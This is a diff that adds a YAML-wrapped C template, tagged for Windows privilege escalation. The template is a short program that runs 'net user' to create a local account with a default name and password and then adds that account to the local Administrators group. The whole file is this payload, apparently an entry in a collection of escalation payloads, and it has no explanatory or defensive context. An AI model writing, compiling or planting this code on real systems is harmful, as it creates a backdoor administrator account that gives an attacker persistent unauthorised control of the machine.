@@ -1,0 +1,19 @@
+---
+metadata:
+  filename: "create-new-local-administrator.c.yaml"
+  tags: ["windows", "privesc"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  #include <stdlib.h>
+
+  int main ()
+  {
+    int i;
+
+    i = system ("net user {{ username | default('privescadmin') }} {{ password | default('privescpass123!') }} /add");
+    i = system ("net localgroup administrators {{ username | default('privescadmin') }} /add");
+
+    return 0;
+  }
